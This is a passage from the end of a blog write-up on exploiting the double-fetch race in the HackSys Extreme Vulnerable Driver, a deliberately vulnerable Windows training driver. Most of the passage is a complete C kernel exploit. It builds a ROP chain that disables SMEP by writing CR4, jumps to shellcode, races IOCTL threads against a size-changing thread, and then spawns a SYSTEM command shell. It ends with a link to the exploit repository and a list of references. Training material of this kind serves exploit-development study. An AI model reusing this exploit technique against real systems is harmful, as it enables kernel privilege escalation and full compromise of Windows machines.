    if (!MoveMem)
    {
        printf("[-] FATAL: Unable to move shellcode into allocated memory!\n");
    }

    unsigned long long ShellcodeBase = (unsigned long long)shellcode;
    return ShellcodeBase;
}

DWORD WINAPI exploit(LPVOID DriverHandle)
{

    LPVOID  UserBuffer = { 0 };
    SIZE_T  UserBufferSize = 2096; // Offset for RIP control is at 2056.
    BOOL    ExploitSuccess;

    HANDLE ChangeSizeThreads[100] = { 0 };
    HANDLE IoControlThreads[100] = { 0 };

    PIO_THREAD_PARAM IoThreadParam = NULL;

    HANDLE ExploitThread = CreateThread(NULL, NULL, exploit, DriverHandle, CREATE_SUSPENDED, NULL);

    /* return number of processors */
    int NumProcessors = CheckProcessors();

    /* Allocate USER_DOUBLE_FETCH struct */
    USER_DOUBLE_FETCH* PtrUserDoubleFetch = (USER_DOUBLE_FETCH*)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE | PAGE_NOCACHE);
    if (!PtrUserDoubleFetch)
    {
        printf("[!] FATAL: Unable to allocate USER_DOUBLE_FETCH struct!\n");
        return;
    }

    /* Allocate USER_DOUBLE_FETCH members */
    UserBuffer = (LPVOID)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);
    if (!UserBuffer)
    {
        printf("[!] FATAL: Failed to allocate heap buffer!\n");
        return;
    }
    printf("\t[+] Allocated user buffer!\n");

    /* Initialize USER_DOUBLE_FETCH struct members */
    PtrUserDoubleFetch->Buffer = UserBuffer;
    PtrUserDoubleFetch->Size = 100;

    unsigned long long BaseAddress = GetKernelBase();
    unsigned long long ShellcodeAddress = CreateShellcode();

    unsigned long long ROP0 = BaseAddress + 0x4eaf14;       // mov rax, rcx ; ret
    unsigned long long ROP1 = BaseAddress + 0x478bf9;       // pop rcx ; ret
    unsigned long long ROP2 = 0x70678;                      // Disable SMEP
    unsigned long long ROP3 = BaseAddress + 0x169f37;       // mov cr4, rcx ; ret 

    RtlFillMemory(UserBuffer, UserBufferSize, 0x41);        // Fill buffer with junk till RIP
    RtlCopyMemory(&UserBuffer[2056], &ROP0, 0x8);           // mov rax, rcx ; ret
    RtlCopyMemory(&UserBuffer[2056 + 8], &ROP1, 0x8);       // pop rcx
    RtlCopyMemory(&UserBuffer[2056 + 16], &ROP2, 0x8);      // SMEP Disable Value
    RtlCopyMemory(&UserBuffer[2056 + 24], &ROP3, 0x8);      // Update CR4 
    RtlCopyMemory(&UserBuffer[2056 + 32], &ShellcodeAddress, 0x8);


    /* Allocate IO_THREAD_PARAM struct */
    IoThreadParam = (PIO_THREAD_PARAM*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IO_THREAD_PARAM));
    if (!IoThreadParam)
    {
        printf("[!] FATAL: Failed to allocate memory for IO thread!\n");
        return;
    }

    /* Initialise IO_THREAD_PARAM struct members */
    IoThreadParam->DriverHandle = DriverHandle;
    IoThreadParam->DoubleFetch = PtrUserDoubleFetch;

    ExploitSuccess = FALSE;

    for (int i = 0; i < NumProcessors; i++)
    {
        ChangeSizeThreads[i] = CreateThread(NULL, NULL, ChangeSizeThread, &PtrUserDoubleFetch->Size, CREATE_SUSPENDED, NULL);
        printf("\t[+] Opened thread for changing size %d\n", ChangeSizeThreads[i]);
        SetThreadPriority(ChangeSizeThreads[i], THREAD_PRIORITY_TIME_CRITICAL);
        printf("\t[+] Set ChangeSizeThread Priority to %d\n", GetThreadPriority(ChangeSizeThreads[i]));

        IoControlThreads[i] = CreateThread(NULL, NULL, IoControlThread, IoThreadParam, CREATE_SUSPENDED, NULL);
        printf("\t[+] Opened thread for IOCTL Control %d\n", IoControlThreads[i]);
        SetThreadPriority(IoControlThreads[i], THREAD_PRIORITY_TIME_CRITICAL);
        printf("\t[+] Set IoControlThread Priority to %d\n", GetThreadPriority(IoControlThreads[i]));

        SetThreadAffinityMask(ChangeSizeThreads[i], 1 << i);
        SetThreadAffinityMask(IoControlThreads[i], 1 << i + 1);
        printf("\t[+] Set Affinity Mask for target threads!\n");

        ResumeThread(ChangeSizeThreads[i]);
        ResumeThread(IoControlThreads[i]);
    }

    int i = 0;
    if (WaitForMultipleObjects(NumProcessors, ChangeSizeThreads, TRUE, 120000))
    {
        for (i = 0; i < NumProcessors; i++)
        {
            TerminateThread(ChangeSizeThreads[i], EXIT_SUCCESS);
            CloseHandle(ChangeSizeThreads[i]);

            TerminateThread(IoControlThreads[i], EXIT_SUCCESS);
            CloseHandle(IoControlThreads[i]);
        }
    }

    system("cmd.exe");
    printf("[*] 1337 System Shell Bozo");

}

int main()
{
    printf("[+] HEVD: Double Fetch\n");

    printf("[*] Opening handle to driver!\n");
    HANDLE DriverHandle = OpenDriverHandle();

    printf("[*] Running exploit function!\n");

    exploit(DriverHandle);

}
```

[Exploit on :fontawesome-brands-github: ](https://github.com/LinxzSec/Kernel-Exploits/blob/main/HEVD/DoubleFetch.c){.md-button .md-button--primary }

<hr>

# Acknowledgements

I would like to sincerely thank [Connor](https://twitter.com/33y0re) for helping me and listening to my stupid ideas. I highly recommend you check out his **much** more technically complex [blog](https://connormcgarr.github.io/). Thanks Connor!

Thanks for reading! I am going to go and get my POC working on RS1 now :p

<hr>

# References

- [1] - [https://research.nccgroup.com/2022/03/28/whitepaper-double-fetch-vulnerabilities-in-c-and-c/](https://research.nccgroup.com/2022/03/28/whitepaper-double-fetch-vulnerabilities-in-c-and-c/)
- [2] - [https://linxz.tech/post/hevd/2022-05-14-hevd3-stackbufferoverflow/](https://linxz.tech/post/hevd/2022-05-14-hevd3-stackbufferoverflow/)
- [3] - [https://stackoverflow.com/questions/252780/why-should-we-typedef-a-struct-so-often-in-c](https://stackoverflow.com/questions/252780/why-should-we-typedef-a-struct-so-often-in-c)
- [4] - [https://stackoverflow.com/questions/44020831/why-to-use-an-underscore-for-a-struct-in-c](https://stackoverflow.com/questions/44020831/why-to-use-an-underscore-for-a-struct-in-c)
- [5] - [https://stackoverflow.com/questions/494163/what-is-pvoid-data-type](https://stackoverflow.com/questions/494163/what-is-pvoid-data-type)
- [6] - [https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/42189.pdf](https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/42189.pdf)
- [7] - [https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocessornumber](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocessornumber)
- [8] - [https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadpriority](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadpriority)
- [9] - [https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setthreadaffinitymask](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setthreadaffinitymask)
- [10] - [https://stackoverflow.com/a/5919745](https://stackoverflow.com/a/5919745)
- [11] - [https://linxz.tech/post/hevd/2022-05-14-hevd3-stackbufferoverflow/](https://linxz.tech/post/hevd/2022-05-14-hevd3-stackbufferoverflow/)

--8<-- "includes/abbreviations.md"